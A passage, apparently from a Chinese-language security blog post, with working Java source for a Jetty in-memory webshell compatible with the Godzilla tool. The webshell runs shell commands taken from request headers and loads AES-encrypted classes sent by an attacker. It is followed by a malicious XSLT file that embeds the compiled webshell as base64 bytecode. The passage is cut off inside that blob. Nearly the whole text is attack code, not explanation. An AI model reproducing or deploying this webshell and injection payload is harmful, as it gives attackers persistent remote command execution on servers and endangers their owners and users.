class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-type">byte</span>[] value = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] x(<span class="hljs-type">byte</span>[] s, <span class="hljs-type">boolean</span> m) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            c.init(m ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(xc.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));<br>            <span class="hljs-keyword">return</span> c.doFinal(s);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(String s, Request base, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="hljs-string">&quot;cmd&quot;</span>)) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;<br>                    String[] cmds = <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                        cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>                    &#125;<br>                    base.setHandled(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\ASADSADASDSADAS&quot;</span>).next();<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    outputStream.write(result.getBytes());<br>                    outputStream.flush();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="hljs-string">&quot;godzilla&quot;</span>)) &#123;<br>                <span class="hljs-comment">// å“¥æ–¯æ‹‰æ˜¯é€šè¿‡ localhost/?pass=payload ä¼ å‚ ä¸å­˜åœ¨åŒ…è£…ç±»é—®é¢˜</span><br>                <span class="hljs-type">byte</span>[] data = base64Decode(request.getParameter(pass));<br>                data = x(data, <span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[<span class="hljs-number">0</span>], Thread.currentThread().getContextClassLoader());<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">defMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>                    defMethod.setAccessible(<span class="hljs-literal">true</span>);<br>                    payload = (Class) defMethod.invoke(urlClassLoader, data, <span class="hljs-number">0</span>, data.length);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">arrOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> payload.newInstance();<br>                    f.equals(arrOut);<br>                    f.equals(data);<br>                    f.equals(request);<br>                    base.setHandled(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    outputStream.write(md5.substring(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>).getBytes());<br>                    f.toString();<br>                    outputStream.write(base64Encode(x(arrOut.toByteArray(), <span class="hljs-literal">true</span>)).getBytes());<br>                    outputStream.write(md5.substring(<span class="hljs-number">16</span>).getBytes());<br>                    outputStream.flush();<br>                    <span class="hljs-keyword">return</span> ;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç¼–è¯‘ä¸€ä¸‹è½¬æˆbase64æ”¾åˆ°xsltæ–‡ä»¶é‡Œé¢å»ï¼Œæœ€ç»ˆçš„æ¶æ„xsltå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;yv66vgAAADMCAAgA+QoA+gD7CgA4APwKADgA/QoA+gD+BwD/CgD6AQAKAAYBAQoABgECCgA4AQMHAQQKAIgBBQgBBgkAgAEHCAEICQCAAQkHAQoKABEBBQoAEQELCgARAQwKAIABDQkAgAEOCQEPARAKAREBEggBEwoANQEUCAEVCgA1ARYKARcBGAoBFwEZBwEaCgCAARsKARwBHQoBHAEeCgA3AR8IALQKAB8BIAoAHwEhBwC1CAEiCACuBwCvCACpCgA1ASMIASQKADgBJQcBJggBJwgBKAoANQEpCgEqASsIASwHAS0HAMEHAS4HAS8IATAKADUBMQgBMggBMwgBNAgBNQgBNggBNwoBOAE5BwE6CgBCATsKATgBPAoBOAE9CAE+CwE/AUAIANMKADgBQQoAOAFCCAFDCgEPAUQKADgBRQgBRgoAOAFHCAFICAFJCAFKCgFLAUwHAU0KAU4BTwoBTgFQCgFRAVIKAFQBUwgBVAoAVAFVCgBUAVYLAVcBWAoBWQFaCgFZAVsIAVwLAT8BXQoAgAFeCgCAAV8JAIABYAcBYQcBYgoBHAFjCgBkAWQHAWUIAWYJAWcBaAoANQFpCgEqARgKAWcBagcBawoAbgEFCgA3ASUKADgBbAoANwEMCgBuAW0KAIABbgoAOAFvCgCAAXAKAC8BcQoBcgFzCgF0AXUHAXYIAXcKAXgBeQoBFwF6CgB6AXsHAXwHAX0KAIABfgoAegF/BwGABwGBCgCEAYIHAYMHAYQHAYUBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQANU3RhY2tNYXBUYWJsZQcBLwcBBAEABjxpbml0PgEAAygpVgEABHRoaXMBAChMY29tL3h4bC9qb2IvY29yZS9KZXR0eUdvZHppbGxhTWVtc2hlbGw7AQAEKEkpVgEAAUkBAAlnZXRVbnNhZmUBABMoKUxzdW4vbWlzYy9VbnNhZmU7AQAGdW5zYWZlAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEACXRoZXVuc2FmZQEAEUxzdW4vbWlzYy9VbnNhZmU7AQAKRXhjZXB0aW9ucwEADWdldFZhbHVlRmllbGQBACsoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENvbm5lY3Rpb247AQAFdmFsdWUBABJMamF2YS9sYW5nL09iamVjdDsBAAFqAQANdGhyZWFkTG9jYWxzRgEAC3RocmVhZGxvY2FsAQAFdGFibGUBABpbTGphdmEvbGFuZy9yZWYvUmVmZXJlbmNlOwEAAWkBAAt0aHJlYWRHcm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAMdGhyZWFkc2ZpbGVkAQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHARoHAYYHAYcHAS4BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABmJhc2U2NAEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJicwEAAltCAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAFaBwF9BwGIAQAGaGFuZGxlAQCGKExqYXZhL2xhbmcvU3RyaW5nO0xvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvUmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEADG91dHB1dFN0cmVhbQEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQADY21kAQAOdXJsQ2xhc3NMb2FkZXIBABlMamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXI7AQAJZGVmTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEABGRhdGEBAARiYXNlAQAiTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9SZXF1ZXN0OwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsHAM8HAYkHAYoBAAg8Y2xpbml0PgEACnZhbHVlRmllbGQBAClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDb25uZWN0aW9uOwEAB2hhbmRsZXIBADRMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL2hhbmRsZXIvSGFuZGxlckNvbGxlY3Rpb247AQASbXV0YWJsZVdoZW5SdW5uaW5nAQAIaGFuZGxlcnMBACNbTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAC25ld0hhbmRsZXJzAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwcBJgcBdgcA7AcBgAcBgwcBhAEAClNvdXJjZUZpbGUBABpKZXR0eUdvZHppbGxhTWVtc2hlbGwuamF2YQEAA01ENQcBiwwBjAGNDAGOAY8MAZABkQwBkgGTAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAZQBjwwAmgGVDAGWAZcMAZgBmQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAJoAmwEAEDNjNmUwYjhhOWMxNTIyNGEMAIkAigEACHVzZXJuYW1lDACLAIoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBmgGbDAGWAZkMAIwAjwwAjACKBwGcDAGdAZ4HAZ8MAaAAngEAD3N1bi5taXNjLlVuc2FmZQwBoQGiAQAJdGhlVW5zYWZlDAGjAaQHAYcMAaUBpgwBpwGoAQAPc3VuL21pc2MvVW5zYWZlDACgAKEHAakMAaoBqwwBrAGtDAGuAa8MAbABsQwBsgGzAQAMdGhyZWFkTG9jYWxzDAG0AZkBACdvcmcuZWNsaXBzZS5qZXR0eS5zZXJ2ZXIuSHR0cENvbm5lY3Rpb24MAbUBtgEAJ29yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IdHRwQ29ubmVjdGlvbgEAEGphdmEudXRpbC5CYXNlNjQBAApnZXRFbmNvZGVyDAG3AbgHAbkMAboBuwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAG8Ab0BAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAA0FFUwcBiAwBjAG+AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAmgG/DAHAAcEMAcIBwwEAC3gtZnVjay1kYXRhBwHEDAHFAI8MAcYBxwwByAHJAQAHb3MubmFtZQwBygCPDAHLAZkBAAN3aW4MAcwBzQEAAi9jAQAJL2Jpbi9iYXNoAQACLWMHAc4MAc8BpgEAEWphdmEvdXRpbC9TY2FubmVyBwHQDAHRAdIMAdMB1AcB1QwB1gHXDACaAdgBABBcQVNBRFNBREFTRFNBREFTDAHZAdoMAdsBmQcB3AwB3QHeBwHfDAHgAeEMAeIAmwEACGdvZHppbGxhDAHjAI8MAMIAwwwAxQDGDACNAI4BABdqYXZhL25ldC9VUkxDbGFzc0xvYWRlcgEADGphdmEvbmV0L1VSTAwB5AHlDACaAeYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwcB5wwB6ACODAHpAbgMAeoB6wEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAHsAe0MAe4BjwwAugC7DAHsAZcMAKcAqAwB7wHwBwHxDAHyAfMHAfQMAfUB9gEAMm9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9oYW5kbGVyL0hhbmRsZXJDb2xsZWN0aW9uAQATX211dGFibGVXaGVuUnVubmluZwcB9wwB6gH4DAH5AfoMAfsB/AEAIG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyAQAmY29tL3h4bC9qb2IvY29yZS9KZXR0eUdvZHppbGxhTWVtc2hlbGwMAJoAngwB/QH+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAJoB/wEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BADBvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXIBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAE2phdmF4L2NyeXB0by9DaXBoZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQALZ2V0SW5zdGFuY2UBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEACHRvU3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARb2JqZWN0RmllbGRPZmZzZXQBABwoTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOylKAQAJZ2V0T2JqZWN0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0opTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAJZ2V0SGVhZGVyAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAB2lzRW1wdHkBAAMoKVoBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBACBvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvUmVxdWVzdAEACnNldEhhbmRsZWQBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAAxnZXRQYXJhbWV0ZXIBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQApKFtMamF2YS9uZXQvVVJMO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAOZ2V0SHR0cENoYW5uZWwBACgoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENoYW5uZWw7AQAkb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDaGFubmVsAQAJZ2V0U2VydmVyAQAjKClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL1NlcnZlcjsBAB9vcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvU2VydmVyAQAKZ2V0SGFuZGxlcgEAJCgpTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAEWphdmEvbGFu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